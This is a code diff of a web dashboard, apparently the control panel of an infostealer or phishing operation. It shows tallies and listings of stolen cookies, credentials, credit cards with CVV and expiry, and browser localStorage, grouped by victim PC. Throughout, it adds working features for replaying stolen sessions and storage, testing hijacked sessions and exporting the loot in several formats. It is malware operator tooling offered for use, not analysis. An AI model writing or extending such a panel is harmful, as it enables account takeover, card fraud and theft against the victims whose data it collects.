             .modal .victim-entry .modal-actions .btn-icon-sm { font-size: 9px; height: 18px; line-height: 18px; }
             .modal .victim-entry .modal-actions { max-width: 70px; }
+            .victim-card .v-actions .btn-sm { font-size: 7px; padding: 1px 5px; }
+            .replay-card .r-actions .btn-sm { font-size: 7px; padding: 1px 5px; }
+            .victim-card .v-header .pc-name { font-size: 11px; }
+            .replay-card .r-header .pc-name { font-size: 11px; }
+            .victim-card .v-domain-list .domain-tag { font-size: 7px; padding: 1px 5px; }
+            .replay-card .r-domain-list .domain-tag { font-size: 7px; padding: 1px 5px; }
         }
         @media (max-width: 360px) {
             .main { padding: 10px; padding-top: 48px; }
-            .domain-card { padding: 10px 12px; }
-            .domain-card .header .domain { font-size: 12px; }
-            .domain-card .victims-list .victim-tag .ip { font-size: 7px; }
-            .topbar .page-title h2 { font-size: 15px; }
+            .pc-card { padding: 10px 10px; }
+            .pc-card .pc-header .pc-name { font-size: 12px; }
+            .pc-card .pc-header .pc-stats { font-size: 9px; gap: 4px; }
+            .pc-card .domain-item .domain-name { font-size: 10px; }
+            .pc-card .domain-item .domain-actions .btn-sm { font-size: 6px; padding: 1px 3px; }
+            .pc-card .pc-actions .btn-sm { font-size: 7px; padding: 1px 4px; }
             .modal .victim-entry .data-section .data-item .value { min-width: 40px; font-size: 8px; }
             .modal .victim-entry .data-section .data-item .label { font-size: 8px; min-width: 30px; }
             .modal .victim-entry .modal-actions { max-width: 60px; }
             .modal .victim-entry .modal-actions .btn-icon-sm { font-size: 8px; padding: 0 3px; height: 16px; line-height: 16px; }
+            .victim-card .v-actions .btn-sm { font-size: 6px; padding: 1px 4px; }
+            .replay-card .r-actions .btn-sm { font-size: 6px; padding: 1px 4px; }
+            .replay-card { padding: 10px 12px; }
+            .victim-card { padding: 10px 12px; }
         }
     </style>
 </head>
@@ -1123,6 +1289,10 @@
             <span class="icon">💳</span> Cards
             <span class="badge" id="cardsCount">0</span>
         </div>
+        <div class="nav-item storage-nav" data-view="storage" id="navStorage">
+            <span class="icon">💾</span> LocalStorage
+            <span class="badge" id="storageCount">0</span>
+        </div>
         <div class="nav-item trash-nav" data-view="trash" id="navTrash">
             <span class="icon">🗑️</span> Trash
             <span class="badge" id="trashCount">0</span>
@@ -1131,14 +1301,14 @@
         <div class="nav-divider"></div>
         <div class="nav-label">Tools</div>
 
-        <div class="nav-item" data-view="replay" id="navReplay">
-            <span class="icon">▶️</span> Session Replay
+        <div class="nav-item replay-nav" data-view="replay" id="navReplay">
+            <span class="icon">▶️</span> Replay
         </div>
         <div class="nav-item" data-view="tester" id="navTester">
-            <span class="icon">🔍</span> Session Tester
+            <span class="icon">🔍</span> Tester
         </div>
         <div class="nav-item" data-view="export" id="navExport">
-            <span class="icon">📥</span> Export Data
+            <span class="icon">📥</span> Export
         </div>
 
         <div class="nav-divider"></div>
@@ -1177,22 +1347,27 @@
             </div>
         </div>
 
-        <!-- VIEW: MAIN DASHBOARD -->
+        <!-- VIEW: MAIN DASHBOARD — PC GROUPED -->
         <div class="view-content active" id="viewMain">
             <div class="stats-row" id="statsRow">
                 <div class="stat-card">
+                    <div class="label">Total PCs</div>
+                    <div class="number green" id="statPcs">0</div>
+                    <div class="sub">Unique computers</div>
+                </div>
+                <div class="stat-card">
                     <div class="label">Total Victims</div>
-                    <div class="number green" id="statVictims">0</div>
+                    <div class="number orange" id="statVictims">0</div>
                     <div class="sub">Unique sessions</div>
                 </div>
                 <div class="stat-card">
                     <div class="label">Total Cookies</div>
-                    <div class="number orange" id="statCookies">0</div>
+                    <div class="number pink" id="statCookies">0</div>
                     <div class="sub">Across all domains</div>
                 </div>
                 <div class="stat-card">
                     <div class="label">Credentials</div>
-                    <div class="number pink" id="statCredentials">0</div>
+                    <div class="number purple" id="statCredentials">0</div>
                     <div class="sub">Usernames, emails, passwords</div>
                 </div>
                 <div class="stat-card">
@@ -1201,14 +1376,9 @@
                     <div class="sub">Card numbers, CVV, expiry</div>
                 </div>
                 <div class="stat-card">
-                    <div class="label">Unique Domains</div>
-                    <div class="number purple" id="statDomains">0</div>
-                    <div class="sub">Websites compromised</div>
-                </div>
-                <div class="stat-card">
-                    <div class="label">Browsers</div>
-                    <div class="number blue" id="statBrowsers">0</div>
-                    <div class="sub">Different browsers</div>
+                    <div class="label">LocalStorage</div>
+                    <div class="number violet" id="statStorage">0</div>
+                    <div class="sub">Stored data from all browsers</div>
                 </div>
             </div>
 
@@ -1216,7 +1386,7 @@
                 <div class="left">
                     <button class="btn primary" onclick="downloadJSON()">📥 JSON</button>
                     <button class="btn warning" onclick="downloadNetscape()">📥 Netscape</button>
-                    <button class="btn" onclick="downloadTxt()" style="border-color:#8b5cf6;color:#8b5cf6;">📥 TXT</button>
+                    <button class="btn violet" onclick="downloadTxt()">📥 TXT</button>
                 </div>
                 <div class="right">
                     <button class="btn danger" onclick="showClearAllConfirm()">🗑️ Clear</button>
@@ -1224,19 +1394,19 @@
                 </div>
             </div>
 
-            <div class="domain-grid" id="domainGrid">
+            <div class="pc-grid" id="pcGrid">
                 <div class="empty-state">
-                    <div class="icon">🍪</div>
-                    <h3>No cookies stolen yet</h3>
-                    <p>Send victims to <code>/home.php</code></p>
+                    <div class="icon">🖥️</div>
+                    <h3>No data stolen yet</h3>
+                    <p>Send victims to <code>/home</code></p>
                 </div>
             </div>
         </div>
 
-        <!-- VIEW: COOKIES -->
+        <!-- VIEW: COOKIES — PC GROUPED -->
         <div class="view-content" id="viewCookies">
             <div class="toolbar" style="margin-bottom:12px;">
-                <div class="left"><span style="color:#64748b;font-size:12px;">All stolen cookies</span></div>
+                <div class="left"><span style="color:#64748b;font-size:12px;">All stolen cookies — grouped by PC</span></div>
                 <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
             </div>
             <div class="cookies-table-wrap" id="cookiesTableWrap">
@@ -1244,10 +1414,10 @@
             </div>
         </div>
 
-        <!-- VIEW: VICTIMS -->
+        <!-- VIEW: VICTIMS — PC GROUPED -->
         <div class="view-content" id="viewVictims">
             <div class="toolbar" style="margin-bottom:12px;">
-                <div class="left"><span style="color:#64748b;font-size:12px;">All victims — click to view details</span></div>
+                <div class="left"><span style="color:#64748b;font-size:12px;">All victims — grouped by PC</span></div>
                 <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
             </div>
             <div class="victims-grid" id="victimsGrid">
@@ -1255,10 +1425,10 @@
             </div>
         </div>
 
-        <!-- VIEW: CREDENTIALS -->
+        <!-- VIEW: CREDENTIALS — PC GROUPED -->
         <div class="view-content" id="viewCreds">
             <div class="toolbar" style="margin-bottom:12px;">
-                <div class="left"><span style="color:#ec4899;font-size:12px;">🔐 Stolen Credentials</span></div>
+                <div class="left"><span style="color:#ec4899;font-size:12px;">🔐 Stolen Credentials — grouped by PC</span></div>
                 <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
             </div>
             <div id="credsTableWrap">
@@ -1266,14 +1436,25 @@
             </div>
         </div>
 
-        <!-- VIEW: CARDS -->
+        <!-- VIEW: CARDS — PC GROUPED -->
         <div class="view-content" id="viewCards">
             <div class="toolbar" style="margin-bottom:12px;">
-                <div class="left"><span style="color:#06b6d4;font-size:12px;">💳 Stolen Cards</span></div>
+                <div class="left"><span style="color:#06b6d4;font-size:12px;">💳 Stolen Cards — grouped by PC</span></div>
                 <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
             </div>
             <div id="cardsTableWrap">
                 <div class="empty-state"><div class="icon">💳</div><h3>No cards stolen</h3></div>
+            </div>
+        </div>
+
+        <!-- VIEW: LOCALSTORAGE — PC GROUPED -->
+        <div class="view-content" id="viewStorage">
+            <div class="toolbar" style="margin-bottom:12px;">
+                <div class="left"><span style="color:#8b5cf6;font-size:12px;">💾 Stolen LocalStorage — grouped by PC</span></div>
+                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
+            </div>
+            <div id="storageTableWrap">
+                <div class="empty-state"><div class="icon">💾</div><h3>No LocalStorage stolen</h3></div>
             </div>
         </div>
 
@@ -1300,32 +1481,23 @@
                     <button class="btn" onclick="switchView('main')">← Back</button>
                 </div>
             </div>
-            <div class="domain-grid" id="trashGrid">
+            <div class="pc-grid" id="trashGrid">
                 <div class="empty-state"><div class="icon">🗑️</div><h3>Trash is empty</h3></div>
             </div>
         </div>
 
-        <!-- VIEW: SESSION REPLAY -->
+        <!-- VIEW: REPLAY — PC GROUPED -->
         <div class="view-content" id="viewReplay">
             <div class="toolbar" style="margin-bottom:12px;">
-                <div class="left"><span style="color:#64748b;font-size:12px;">Select a domain</span></div>
+                <div class="left"><span style="color:#f472b6;font-size:12px;">▶️ Replay — grouped by PC</span></div>
                 <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
             </div>
-            <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:16px;max-width:450px;">
-                <div style="margin-bottom:10px;">
-                    <label style="color:#94a3b8;font-size:12px;display:block;margin-bottom:3px;">Domain</label>
-                    <select id="replayDomainSelect" style="width:100%;padding:8px 12px;background:#0b0f1a;border:1px solid #1a2538;border-radius:6px;color:#e2e8f0;font-size:13px;outline:none;">
-                        <option value="">— Loading —</option>
-                    </select>
-                </div>
-                <button class="btn primary" onclick="replaySelectedDomain()" style="width:100%;justify-content:center;padding:8px;">
-                    ▶️ Replay
-                </button>
-                <div id="replayStatus" style="margin-top:10px;font-size:11px;color:#64748b;text-align:center;"></div>
+            <div class="replay-grid" id="replayGrid">
+                <div class="empty-state"><div class="icon">▶️</div><h3>No victims to replay</h3></div>
             </div>
         </div>
 
-        <!-- VIEW: SESSION TESTER -->
+        <!-- VIEW: TESTER -->
         <div class="view-content" id="viewTester">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#64748b;font-size:12px;">Test all domains</span></div>
@@ -1341,7 +1513,7 @@
             </div>
         </div>
 
-        <!-- VIEW: EXPORT DATA — ADDED TXT -->
+        <!-- VIEW: EXPORT DATA -->
         <div class="view-content" id="viewExport">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#64748b;font-size:12px;">Export formats</span></div>
@@ -1371,7 +1543,7 @@
                 <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:14px;text-align:center;">
                     <div style="font-size:28px;margin-bottom:4px;">📝</div>
                     <div style="font-weight:600;color:#f1f5f9;font-size:13px;">TXT</div>
-                    <button class="btn" onclick="downloadTxt()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;border-color:#8b5cf6;color:#8b5cf6;">Download</button>
+                    <button class="btn violet" onclick="downloadTxt()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;">Download</button>
                 </div>
             </div>
         </div>
@@ -1388,9 +1560,10 @@
             <h2 id="modalTitle">Victim Details</h2>
             <div id="modalContent"></div>
             <div class="session-actions">
-                <button class="btn primary" onclick="replayFromModal()">▶️ Replay</button>
+                <button class="btn primary" onclick="replayFromModal()">▶️ Replay Cookies</button>
+                <button class="btn violet" onclick="replayStorageFromModal()">💾 Replay Storage</button>
                 <button class="btn test" style="border-color:#3b82f6;color:#3b82f6;" onclick="testFromModal()">🔍 Test</button>
-                <button class="btn" onclick="downloadModalTxt()" style="border-color:#8b5cf6;color:#8b5cf6;">📥 TXT</button>
+                <button class="btn violet" onclick="downloadModalTxt()">📥 TXT</button>
             </div>
             <div class="test-result" id="testResultModal"></div>
         </div>
@@ -1472,7 +1645,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    DASHBOARD LOGIC — ALL FEATURES + TXT EXPORT
+    DASHBOARD LOGIC — PC GROUPING
     ============================================================ -->
     <script>
         // ============================================================
@@ -1483,12 +1656,12 @@
             try {
                 const res = await fetch('/api/data');
                 if (res.status === 401) {
-                    window.location.href = '/login.php';
+                    window.location.href = '/login';
                     return false;
                 }
                 return true;
             } catch (e) {
-                window.location.href = '/login.php';
+                window.location.href = '/login';
                 return false;
             }
         }
@@ -1619,14 +1792,15 @@
             document.querySelectorAll('.sidebar .nav-item').forEach(el => el.classList.remove('active'));
 
             const viewMap = {
-                'main': { viewId: 'viewMain', navId: 'navMain', title: 'Dashboard', sub: 'Monitor stolen cookies & sessions · ' },
-                'cookies': { viewId: 'viewCookies', navId: 'navCookies', title: '🍪 All Cookies', sub: 'View all stolen cookies' },
-                'victims': { viewId: 'viewVictims', navId: 'navVictims', title: '👤 All Victims', sub: 'All victims — click to view details' },
-                'creds': { viewId: 'viewCreds', navId: 'navCreds', title: '🔐 Credentials', sub: 'All stolen credentials' },
-                'cards': { viewId: 'viewCards', navId: 'navCards', title: '💳 Cards', sub: 'All stolen credit cards' },
+                'main': { viewId: 'viewMain', navId: 'navMain', title: 'Dashboard', sub: 'Monitor stolen data · ' },
+                'cookies': { viewId: 'viewCookies', navId: 'navCookies', title: '🍪 All Cookies', sub: 'Grouped by PC' },
+                'victims': { viewId: 'viewVictims', navId: 'navVictims', title: '👤 All Victims', sub: 'Grouped by PC' },
+                'creds': { viewId: 'viewCreds', navId: 'navCreds', title: '🔐 Credentials', sub: 'Grouped by PC' },
+                'cards': { viewId: 'viewCards', navId: 'navCards', title: '💳 Cards', sub: 'Grouped by PC' },
+                'storage': { viewId: 'viewStorage', navId: 'navStorage', title: '💾 LocalStorage', sub: 'Grouped by PC' },
                 'trash': { viewId: 'viewTrash', navId: 'navTrash', title: '🗑️ Trash', sub: 'Deleted victims' },
-                'replay': { viewId: 'viewReplay', navId: 'navReplay', title: '▶️ Session Replay', sub: 'Replay a session' },
-                'tester': { viewId: 'viewTester', navId: 'navTester', title: '🔍 Session Tester', sub: 'Test all domains' },
+                'replay': { viewId: 'viewReplay', navId: 'navReplay', title: '▶️ Replay', sub: 'Grouped by PC' },
+                'tester': { viewId: 'viewTester', navId: 'navTester', title: '🔍 Tester', sub: 'Test all domains' },
                 'export': { viewId: 'viewExport', navId: 'navExport', title: '📥 Export Data', sub: 'Export formats' }
             };
 
@@ -1644,7 +1818,8 @@
             else if (view === 'victims') renderVictimsView();
             else if (view === 'creds') renderCredsView();
             else if (view === 'cards') renderCardsView();
-            else if (view === 'replay') populateReplayDomains();
+            else if (view === 'storage') renderStorageView();
+            else if (view === 'replay') renderReplayView();
             else if (view === 'main') fetchData();
             else if (view === 'trash') fetchTrash();
         }
@@ -1656,7 +1831,7 @@
         async function fetchData() {
             try {
                 const res = await fetch('/api/data');
-                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 allData = await res.json();
                 render(allData);
                 updateSidebarCounts(allData);
@@ -1665,8 +1840,10 @@
                 if (currentView === 'cards') renderCardsView();
                 if (currentView === 'cookies') renderCookiesView();
                 if (currentView === 'victims') renderVictimsView();
+                if (currentView === 'storage') renderStorageView();
+                if (currentView === 'replay') renderReplayView();
             } catch(e) {
-                if (e.message && e.message.includes('401')) window.location.href = '/login.php';
+                if (e.message && e.message.includes('401')) window.location.href = '/login';
                 else showToast('⚠️ Failed to fetch data', 'error');
             }
         }
@@ -1674,14 +1851,14 @@
         async function fetchTrash() {
             try {
                 const res = await fetch('/api/trash');
-                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 trashData = await res.json();
                 renderTrash(trashData);
                 document.getElementById('trashCount').textContent = trashData.length;
                 document.getElementById('trashItemCount').textContent = trashData.length;
                 document.getElementById('trashDomainCount').textContent = new Set(trashData.map(e => e.fingerprint?.hostname || e.domain || 'unknown')).size;
             } catch(e) {
-                if (e.message && e.message.includes('401')) window.location.href = '/login.php';
+                if (e.message && e.message.includes('401')) window.location.href = '/login';
                 else showToast('⚠️ Failed to fetch trash', 'error');
             }
         }
@@ -1694,413 +1871,546 @@
             let totalCookies = 0;
             let totalCreds = 0;
             let totalCards = 0;
+            let totalStorage = 0;
             const victims = data.length;
+            const pcs = new Set();
 
             data.forEach(entry => {
+                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
+                pcs.add(pc);
                 totalCookies += Object.keys(entry.cookies || {}).length;
                 totalCreds += (entry.credentials || []).length;
                 totalCards += (entry.cards || []).length;
+                totalStorage += Object.keys(entry.localStorage || {}).length;
             });
 
+            document.getElementById('statPcs').textContent = pcs.size;
+            document.getElementById('statVictims').textContent = victims;
+            document.getElementById('statCookies').textContent = totalCookies;
+            document.getElementById('statCredentials').textContent = totalCreds;
+            document.getElementById('statCards').textContent = totalCards;
+            document.getElementById('statStorage').textContent = totalStorage;
             document.getElementById('cookiesCount').textContent = totalCookies;
             document.getElementById('victimsCount').textContent = victims;
             document.getElementById('credsCount').textContent = totalCreds;
             document.getElementById('cardsCount').textContent = totalCards;
+            document.getElementById('storageCount').textContent = totalStorage;
         }
 
         // ============================================================
-        // RENDER DASHBOARD
+        // GROUP BY PC HELPER
+        // ============================================================
+
+        function groupByPC(data) {
+            const grouped = {};
+            data.forEach(entry => {
+                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
+                if (!grouped[pc]) {
+                    grouped[pc] = {
+                        pcName: pc,
+                        ip: entry.ip || 'Unknown',
+                        country: entry.country || 'Unknown',
+                        countryCode: entry.countryCode || 'XX',
+                        latestTime: entry.receivedAt || new Date().toISOString(),
+                        totalVictims: 0,
+                        totalCookies: 0,
+                        totalCreds: 0,
+                        totalCards: 0,
+                        totalStorage: 0,
+                        entries: [],
+                        domains: {}
+                    };
+                }
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (!grouped[pc].domains[domain]) {
+                    grouped[pc].domains[domain] = {
+                        domain: domain,
+                        entries: [],
+                        cookies: 0,
+                        creds: 0,
+                        cards: 0,
+                        storage: 0,
+                        latestTime: entry.receivedAt || new Date().toISOString()
+                    };
+                }
+                grouped[pc].domains[domain].entries.push(entry);
+                grouped[pc].domains[domain].cookies += Object.keys(entry.cookies || {}).length;
+                grouped[pc].domains[domain].creds += (entry.credentials || []).length;
+                grouped[pc].domains[domain].cards += (entry.cards || []).length;
+                grouped[pc].domains[domain].storage += Object.keys(entry.localStorage || {}).length;
+                if (entry.receivedAt && entry.receivedAt > grouped[pc].domains[domain].latestTime) {
+                    grouped[pc].domains[domain].latestTime = entry.receivedAt;
+                }
+
+                grouped[pc].totalVictims++;
+                grouped[pc].totalCookies += Object.keys(entry.cookies || {}).length;
+                grouped[pc].totalCreds += (entry.credentials || []).length;
+                grouped[pc].totalCards += (entry.cards || []).length;
+                grouped[pc].totalStorage += Object.keys(entry.localStorage || {}).length;
+                grouped[pc].entries.push(entry);
+                if (entry.receivedAt && entry.receivedAt > grouped[pc].latestTime) {
+                    grouped[pc].latestTime = entry.receivedAt;
+                    grouped[pc].ip = entry.ip || 'Unknown';
+                    grouped[pc].country = entry.country || 'Unknown';
+                    grouped[pc].countryCode = entry.countryCode || 'XX';
+                }
+            });
+            return grouped;
+        }
+
+        // ============================================================
+        // RENDER DASHBOARD — PC GROUPED
         // ============================================================
 
         function render(data) {
-            const domains = new Set();
-            let totalCookies = 0;
-            let totalCreds = 0;
-            let totalCards = 0;
-            const domainStats = {};
-            const browsers = new Set();
+            const grouped = groupByPC(data);
+            const pcNames = Object.keys(grouped);
 
-            data.forEach(entry => {
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                domains.add(domain);
-                const cookieCount = Object.keys(entry.cookies || {}).length;
-                totalCookies += cookieCount;
-                const creds = entry.credentials || [];
-                const cards = entry.cards || [];
-                totalCreds += creds.length;
-                totalCards += cards.length;
-
-                const ua = entry.fingerprint?.userAgent || '';
-                let browser = 'Unknown';
-                if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-                else if (ua.includes('Edg')) browser = 'Edge';
-                else if (ua.includes('Firefox')) browser = 'Firefox';
-                else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-                else if (ua.includes('Opera')) browser = 'Opera';
-                else if (ua.includes('Brave')) browser = 'Brave';
-                else if (ua.includes('PowerShell')) browser = 'PowerShell';
-                browsers.add(browser);
-
-                if (!domainStats[domain]) {
-                    domainStats[domain] = { cookies: 0, victims: 0, entries: [], browsers: new Set(), creds: 0, cards: 0 };
-                }
-                domainStats[domain].cookies += cookieCount;
-                domainStats[domain].victims += 1;
-                domainStats[domain].creds += creds.length;
-                domainStats[domain].cards += cards.length;
-                domainStats[domain].entries.push(entry);
-                domainStats[domain].browsers.add(browser);
-            });
-
-            document.getElementById('statVictims').textContent = data.length;
-            document.getElementById('statCookies').textContent = totalCookies;
-            document.getElementById('statCredentials').textContent = totalCreds;
-            document.getElementById('statCards').textContent = totalCards;
-            document.getElementById('statDomains').textContent = domains.size;
-            document.getElementById('statBrowsers').textContent = browsers.size;
-
-            const sorted = Object.entries(domainStats).sort((a, b) => b[1].cookies - a[1].cookies);
-            const grid = document.getElementById('domainGrid');
+            const grid = document.getElementById('pcGrid');
             grid.innerHTML = '';
 
-            if (sorted.length === 0) {
-                grid.innerHTML = `<div class="empty-state"><div class="icon">🍪</div><h3>No cookies stolen yet</h3><p>Send victims to <code>/home.php</code></p></div>`;
+            if (pcNames.length === 0) {
+                grid.innerHTML = `<div class="empty-state"><div class="icon">🖥️</div><h3>No data stolen yet</h3><p>Send victims to <code>/home</code></p></div>`;
                 return;
             }
 
-            sorted.forEach(([domain, stats]) => {
-                let hasValuable = false;
-                stats.entries.forEach(entry => {
-                    Object.keys(entry.cookies || {}).forEach(name => {
-                        if (isValuable(name)) hasValuable = true;
-                    });
+            pcNames.forEach(pcName => {
+                const pc = grouped[pcName];
+                const flag = getFlagEmoji(pc.countryCode);
+                const domainNames = Object.keys(pc.domains);
+
+                let domainsHtml = '';
+                domainNames.forEach(domain => {
+                    const d = pc.domains[domain];
+                    const hasCookies = d.cookies > 0;
+                    const hasStorage = d.storage > 0;
+
+                    domainsHtml += `
+                        <div class="domain-item">
+                            <span class="domain-name">🌐 ${domain}</span>
+                            <div class="domain-stats">
+                                <span class="cookies">🍪 ${d.cookies}</span>
+                                ${d.creds > 0 ? `<span class="creds">🔐 ${d.creds}</span>` : ''}
+                                ${d.cards > 0 ? `<span class="cards">💳 ${d.cards}</span>` : ''}
+                                ${d.storage > 0 ? `<span class="storage">💾 ${d.storage}</span>` : ''}
+                            </div>
+                            <div class="domain-actions">
+                                <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayDomainForPC('${pcName}', '${domain}')` : ''}" title="${hasCookies ? 'Replay cookies' : 'No cookies'}">▶️</button>
+                                <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayStorageDomain('${pcName}', '${domain}')` : ''}" title="${hasStorage ? 'Replay storage' : 'No storage'}">💾</button>
+                                <button class="btn-sm test-sm" onclick="event.stopPropagation(); testDomainFromPC('${pcName}', '${domain}')">🔍</button>
+                                <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomainFromPC('${pcName}', '${domain}')">📥</button>
+                                <button class="btn-sm view" onclick="event.stopPropagation(); openPCModal('${pcName}', '${domain}')">👁️</button>
+                            </div>
+                        </div>
+                    `;
                 });
 
                 const card = document.createElement('div');
-                card.className = 'domain-card';
-
-                let victimsHtml = '';
-                const uniqueVictims = stats.entries.slice(0, 5);
-                uniqueVictims.forEach(entry => {
-                    const flag = getFlagEmoji(entry.countryCode);
-                    const time = timeAgo(entry.receivedAt);
-                    victimsHtml += `
-                        <span class="victim-tag" onclick="event.stopPropagation(); openModalForEntry('${entry._uniqueId}')" title="${entry.ip} · ${entry.country} · ${formatFullTime(entry.receivedAt)}">
-                            <span class="flag">${flag}</span>
-                            <span class="ip">${entry.ip}</span>
-                            <span class="time"><span class="ago">${time}</span></span>
-                        </span>
-                    `;
-                });
-                if (stats.entries.length > 5) {
-                    victimsHtml += `<span class="victim-tag" style="background:transparent;border-color:transparent;color:#475569;cursor:default;">+${stats.entries.length - 5}</span>`;
-                }
-
-                let badges = '';
-                if (hasValuable) badges += `<span class="badge-valuable">🔑 Session</span>`;
-                if (stats.creds > 0) badges += `<span class="badge-cred">🔐 ${stats.creds}</span>`;
-                if (stats.cards > 0) badges += `<span class="badge-card">💳 ${stats.cards}</span>`;
-
-                const latestTime = stats.entries[stats.entries.length - 1]?.receivedAt || null;
-                const latestTimeFormatted = latestTime ? timeAgo(latestTime) : 'never';
-
-                const browserDisplay = Array.from(stats.browsers).slice(0, 2).join(', ') || 'Unknown';
-
+                card.className = 'pc-card';
                 card.innerHTML = `
-                    <div class="header">
-                        <span class="domain">${domain}</span>
-                        <div style="display:flex;gap:4px;flex-wrap:wrap;">${badges}</div>
+                    <div class="pc-header">
+                        <div class="pc-name">
+                            <span class="icon">🖥️</span>
+                            ${pcName}
+                            <span style="font-size:11px;color:#64748b;font-weight:400;">(${pc.totalVictims} victims)</span>
+                        </div>
+                        <div class="pc-stats">
+                            <span class="cookies">🍪 ${pc.totalCookies}</span>
+                            <span class="creds">🔐 ${pc.totalCreds}</span>
+                            <span class="cards">💳 ${pc.totalCards}</span>
+                            <span class="storage">💾 ${pc.totalStorage}</span>
+                        </div>
                     </div>
-                    <div class="stats">
-                        <span class="cookies">🍪 <strong>${stats.cookies}</strong></span>
-                        <span class="victims">👤 <strong>${stats.victims}</strong></span>
-                        ${stats.creds > 0 ? `<span class="creds">🔐 <strong>${stats.creds}</strong></span>` : ''}
-                        ${stats.cards > 0 ? `<span class="cards">💳 <strong>${stats.cards}</strong></span>` : ''}
-                        <span>${browserDisplay}</span>
+                    <div class="pc-meta">
+                        <span class="flag">${flag}</span>
+                        <span class="ip">${pc.ip}</span>
+                        <span class="country">${pc.country}</span>
+                        <span style="color:#475569;">🕐 ${timeAgo(pc.latestTime)}</span>
                     </div>
-                    <div class="victims-list">${victimsHtml}</div>
-                    <div class="meta">
-                        <span class="latest-time">🕐 <span class="time-text">${latestTimeFormatted}</span></span>
-                        <span>
-                            ${stats.entries.length} total
-                            <button class="delete-domain-btn" onclick="event.stopPropagation(); showDeleteDomainConfirm('${domain}')">🗑️</button>
-                            <button class="delete-domain-btn" onclick="event.stopPropagation(); downloadDomainTxt('${domain}')" style="border-color:#8b5cf6;color:#8b5cf6;margin-left:4px;">📝</button>
-                        </span>
+                    <div class="domain-list">
+                        ${domainsHtml}
                     </div>
-                    <div class="actions">
-                        <button class="btn-sm replay" onclick="event.stopPropagation(); replaySession('${domain}')">▶️</button>
-                        <button class="btn-sm test" onclick="event.stopPropagation(); testSession('${domain}')">🔍</button>
-                        <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomain('${domain}')">📥</button>
-                        <button class="btn-sm delete" onclick="event.stopPropagation(); showDeleteDomainConfirm('${domain}')">🗑️</button>
-                        <button class="btn-sm txt" onclick="event.stopPropagation(); downloadDomainTxt('${domain}')">📝</button>
+                    <div class="pc-actions">
+                        <button class="btn-sm danger" onclick="showDeletePCConfirm('${pcName}')">🗑️ Delete PC</button>
+                        <button class="btn-sm primary" onclick="downloadPCTxt('${pcName}')">📝 TXT</button>
+                        <button class="btn-sm violet" onclick="downloadPCJson('${pcName}')">📄 JSON</button>
                     </div>
                 `;
-                card.onclick = () => openModal(domain, stats, 'main');
                 grid.appendChild(card);
             });
         }
 
         function renderTrash(data) {
-            const domains = new Set();
-            const domainStats = {};
-
-            data.forEach(entry => {
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                domains.add(domain);
-
-                if (!domainStats[domain]) {
-                    domainStats[domain] = { entries: [] };
-                }
-                domainStats[domain].entries.push(entry);
-            });
-
-            document.getElementById('trashItemCount').textContent = data.length;
-            document.getElementById('trashDomainCount').textContent = domains.size;
+            const grouped = groupByPC(data);
+            const pcNames = Object.keys(grouped);
 
             const grid = document.getElementById('trashGrid');
             grid.innerHTML = '';
 
-            if (data.length === 0) {
+            if (pcNames.length === 0) {
                 grid.innerHTML = `<div class="empty-state"><div class="icon">🗑️</div><h3>Trash is empty</h3></div>`;
                 return;
             }
 
-            const sorted = Object.entries(domainStats).sort((a, b) => b[1].entries.length - a[1].entries.length);
+            pcNames.forEach(pcName => {
+                const pc = grouped[pcName];
+                const flag = getFlagEmoji(pc.countryCode);
 
-            sorted.forEach(([domain, stats]) => {
                 const card = document.createElement('div');
-                card.className = 'domain-card';
-
-                let victimsHtml = '';
-                const entries = stats.entries.slice(0, 5);
-                entries.forEach(entry => {
-                    const flag = getFlagEmoji(entry.countryCode);
-                    const deleted = entry.deletedAt ? timeAgo(entry.deletedAt) : 'Unknown';
-                    victimsHtml += `
-                        <span class="victim-tag" onclick="event.stopPropagation(); openModalForEntry('${entry._uniqueId}')" title="${entry.ip} · ${entry.country} · Deleted: ${formatFullTime(entry.deletedAt)}">
-                            <span class="flag">${flag}</span>
-                            <span class="ip">${entry.ip}</span>
-                            <span class="time"><span style="color:#f59e0b;">🗑️ ${deleted}</span></span>
-                        </span>
+                card.className = 'pc-card';
+                let domainsHtml = '';
+                Object.keys(pc.domains).forEach(domain => {
+                    const d = pc.domains[domain];
+                    domainsHtml += `
+                        <div class="domain-item">
+                            <span class="domain-name">🌐 ${domain}</span>
+                            <div class="domain-stats">
+                                <span class="cookies">🍪 ${d.cookies}</span>
+                                ${d.creds > 0 ? `<span class="creds">🔐 ${d.creds}</span>` : ''}
+                                ${d.cards > 0 ? `<span class="cards">💳 ${d.cards}</span>` : ''}
+                                ${d.storage > 0 ? `<span class="storage">💾 ${d.storage}</span>` : ''}
+                            </div>
+                        </div>
                     `;
                 });
-                if (stats.entries.length > 5) {
-                    victimsHtml += `<span class="victim-tag" style="background:transparent;border-color:transparent;color:#475569;cursor:default;">+${stats.entries.length - 5}</span>`;
-                }
-
                 card.innerHTML = `
